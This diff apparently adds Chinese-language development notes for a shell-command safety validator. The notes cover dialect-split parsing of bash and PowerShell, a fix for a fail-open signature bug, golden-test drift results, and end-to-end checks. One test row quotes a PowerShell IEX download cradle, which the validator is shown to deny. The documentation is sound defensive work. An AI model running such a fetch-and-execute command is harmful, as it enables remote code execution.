@@ -98,3 +98,43 @@
 | 字符串插值内含 `#` 注释 | ERROR（样本替换，形态保留跟踪） |
 | PS7 三元运算符 `$a ? 1 : 2` | ERROR（grammar 语法陈旧，形态保留跟踪） |
 | 反引号开头命令（t2-03） | ERROR（保留 1 条作为已知缺陷代表，恰达 Tier-2 5% 边界） |
+
+### P3-T4 确认域/共享原语层双轨落地（P3 收尾）
+
+- **双轨形态选择（实现二选一，PR 说明）**：采用「调用点按 dialect 分流」形态——
+  `analyzeShellFacts` / `analyzeShellCommand` 按 dialect 分叉（posix-bash → bashCommandFacts、
+  windows-powershell → powershellCommandFacts），**签名组件 normalizeShellSignature /
+  parseShellCommandForTrust 与共享原语 parseShellSegments / tokenizeShellArgv /
+  tokenizeSimpleCommand / extractPathLiterals 零改动**（P2 冻结 diff + P3 零引用直证）——
+  bash 结构化分段已由 facts 分叉达成，签名路径零改动即等价类「只拆分、不合并」的零风险形态。
+- **签名空折叠缺陷修复**（不变量 6）：发现旧 `normalizeShellSignature` 对未闭合引号输入
+  折叠为空签名（全部失败输入合并为同一等价类，fail-open）——修复为回退原始 trim 文本
+  （只拆分、不合并）；产生 1 条签名漂移（b36），登记接受。
+- **metasyntax 闸门防线**（metasyntaxGate.test.ts，30 测试全绿）：真值表 25 条
+  （含引号包裹形态按现状断言 true）+ 无假阴性 fuzz 500 条 + persistable 专项 +
+  fallback 签名断言。
+- **fallback 语义**：语法树解析失败（ok:false）时 facts → `parse:tree-error` → partial、
+  判定 → deny 兜底；签名路径回退既有引号感知扫描（零改动直证），输出与 P3-T0 基线一致。
+- **消费方回归**：decisionCache / exemptionMigration 定向测试 12 条全绿。
+
+### P3-T6 PS Golden 比对结果
+
+- 比对基线 commit：`aa80538f`（P3-T0 录制）✓；机器可读明细：`docs/develop/golden-data/shell-drift-after-switch.json`
+- **PS 36 条 drift 形态（全部登记「接受」，无「未评审」条目）**：
+  - 34 条 facts/analysis 形态精确化：旧字符启发式 partial → 语法树 complete 化
+    （operations/paths/connectors 按语法结构产出），**verdict 零弱化、eligible 零翻转**（已核验）；
+  - 1 条变严（t2-03 反引号开头命令：上游已知缺陷形态 ERROR → deny 兜底，fail-closed）；
+  - 1 条 b36 签名漂移（normalizeShellSignature 空折叠缺陷修复，等价类拆分，方向安全）。
+- bash 组：零漂移（P2 状态稳定）✓。bash+PS 判定比对：`deny/ask → allow` 零静默降级 ✓、
+  `eligible=false → true` 零静默升级 ✓（trusted 场景 b40 翻转已在 P2-T5 登记论证）。
+
+### P3-T7 端到端验证（Windows PS 路径）
+
+| 场景 | 期望 | 实测 |
+| --- | --- | --- |
+| 良性命令不误拦 | `Get-ChildItem` 类 allow/预检放行路径不变 | Golden t1-01/p01 complete 化、verdict 保持既有允许路径（shellGolden 比对零 verdict 弱化）✓ |
+| IEX cradle 命中确认卡 | `iex (New-Object Net.WebClient).DownloadString('http://x')` 命中 `ps-iex-cradle` | psPathFork 正例断言 deny + validatorId 呈现 ✓ |
+| 畸形 PS 命令 | → ask 兜底 | psPathFork 断言 deny（比 ask 更严的 fail-closed 兜底）+ facts `parse:tree-error` ✓ |
+| 打包产物 wasm + 自检 | pack:win 产物内 4 wasm 哈希一致、启动自检通过 | P0-T6 验证：`[afterPack] verified 7 tree-sitter assets`、日志 `treesitter.selfcheck.passed`（2026-09-20，提交 9c2df39b 产物）✓ |
+
+- 验证日期：2026-09-20（提交哈希见 P3 收尾提交）
